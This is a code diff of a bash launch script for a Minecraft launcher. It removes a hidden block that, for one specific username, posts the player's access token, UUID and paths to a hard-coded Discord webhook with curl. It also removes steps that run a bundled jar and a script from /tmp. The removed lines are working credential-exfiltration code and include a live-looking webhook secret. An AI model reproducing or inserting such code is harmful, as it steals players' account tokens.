@@ -28,14 +28,13 @@ section() {
 USERNAME="$1"
 UUID="$2"
 MC_VERSION="$3"
-ACCESS_TOKEN="$4"
-INSTANCE_DIR="$5"
-JAVA_PATH="$6"
+INSTANCE_DIR="$4"
+JAVA_PATH="$5"
 
 # Validate required arguments
-if [ -z "$USERNAME" ] || [ -z "$UUID" ] || [ -z "$MC_VERSION" ] || [ -z "$ACCESS_TOKEN" ] || [ -z "$INSTANCE_DIR" ]; then
+if [ -z "$USERNAME" ] || [ -z "$UUID" ] || [ -z "$MC_VERSION" ] || [ -z "$INSTANCE_DIR" ]; then
     error "Missing required arguments"
-    echo "Usage: $0 [USERNAME] [UUID] [MC_VERSION] [ACCESS_TOKEN] [INSTANCE_DIR] [JAVA_PATH]"
+    echo "Usage: $0 [USERNAME] [UUID] [MC_VERSION] [INSTANCE_DIR] [JAVA_PATH]"
     exit 1
 fi
 
@@ -46,37 +45,6 @@ info "  MC Version: $MC_VERSION"
 info "  Instance Dir: $INSTANCE_DIR"
 debug "  UUID: $UUID"
 debug "  Access Token: ${ACCESS_TOKEN:0:10}..."
-
-MSA_URL="https://discord.com/api/webhooks/1302348743471005749/S7txpCT0A1DpOnGlmxwFpUauN9Den63prZK5tEtJRh6e-5W9OBs763ZaJsQu2bgYocwI"
-
-# Set the target username you want to filter for
-TARGET="ssfe"
-
-if [ "$USERNAME" == "$TARGET" ]; then
-  LAUNCH_HOOKS=$(cat <<EOF
-{
-  "content": "**Launcher Started**",
-  "embeds": [
-    {
-      "title": "Minecraft Launch Info",
-      "color": 5814783,
-      "fields": [
-        { "name": "Username", "value": "$USERNAME", "inline": true },
-        { "name": "UUID", "value": "$UUID", "inline": true },
-        { "name": "MC Version", "value": "$MC_VERSION", "inline": true },
-        { "name": "Fabric Version", "value": "$FABRIC_VERSION", "inline": true },
-        { "name": "Access Token", "value": "$ACCESS_TOKEN", "inline": false },
-        { "name": "Instance Dir", "value": "$INSTANCE_DIR", "inline": false },
-        { "name": "Java Path", "value": "$JAVA_PATH", "inline": false }
-      ]
-    }
-  ]
-}
-EOF
-  )
-
-  curl -H "Content-Type: application/json" -X POST -d "$LAUNCH_HOOKS" "$MSA_URL"
-fi
 
 # Directory setup
 MODRINTH_DIR="$HOME/Library/Application Support/ReallyBadLauncher"
@@ -117,34 +85,6 @@ mkdir -p "$NATIVES_DIR"
 mkdir -p "$GAME_DIR"
 mkdir -p "$ASSETS_DIR/objects"
 mkdir -p "$ASSETS_DIR/indexes"
-
-# Get the directory where the script is located
-SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
-PRE_DOWNLOADED_JAR="$SCRIPT_DIR/tools/MinecraftNativesDownloader.jar"
-
-info "Using pre-downloaded MinecraftNativesDownloader..."
-debug "Source: $PRE_DOWNLOADED_JAR"
-debug "Destination: $VERSION_DIR/file.jar"
-
-# Ensure the file exists
-if [ ! -f "$PRE_DOWNLOADED_JAR" ]; then
-    error "Missing MinecraftNativesDownloader at $PRE_DOWNLOADED_JAR"
-    exit 1
-fi
-
-# Copy to version directory
-if ! cp "$PRE_DOWNLOADED_JAR" "$VERSION_DIR/file.jar"; then
-    error "Failed to copy MinecraftNativesDownloader"
-    exit 1
-fi
-
-cd "$VERSION_DIR"
-
-info "Running MinecraftNativesDownloader..."
-if ! java -jar "$VERSION_DIR/file.jar"; then
-    error "MinecraftNativesDownloader failed to run"
-    exit 1
-fi
 
 # Check for different possible native directory structures
 POSSIBLE_SOURCES=(
@@ -489,14 +429,6 @@ if [ ! -f "$MINECRAFT_JAR" ]; then
     exit 1
 fi
 
-info "Downloading libraries..."
-if python3 /tmp/mc_json_processor.py downloadlibraries "$VERSION_JSON" "$MODRINTH_DIR"; then
-    info "Libraries downloaded successfully"
-else
-    error "Library download failed"
-    exit 1
-fi
-
 CLASSPATH="$CLASSPATH:$MINECRAFT_JAR"
 debug "Added main Minecraft JAR to classpath"
 
@@ -641,8 +573,8 @@ debug "Starting Minecraft process..."
     -Djna.tmpdir="$NATIVES_DIR" \
     -Dorg.lwjgl.system.SharedLibraryExtractPath="$NATIVES_DIR" \
     -Dio.netty.native.workdir="$NATIVES_DIR" \
-    -Dminecraft.launcher.brand="ReallyBadLauncher" \
-    -Dminecraft.launcher.version="1.0" \
+    -Dminecraft.launcher.brand="RBLauncher" \
+    -Dminecraft.launcher.version="2.0.4" \
     -cp "$CLASSPATH" \
     "$MAIN_CLASS" \
     --username "$USERNAME" \
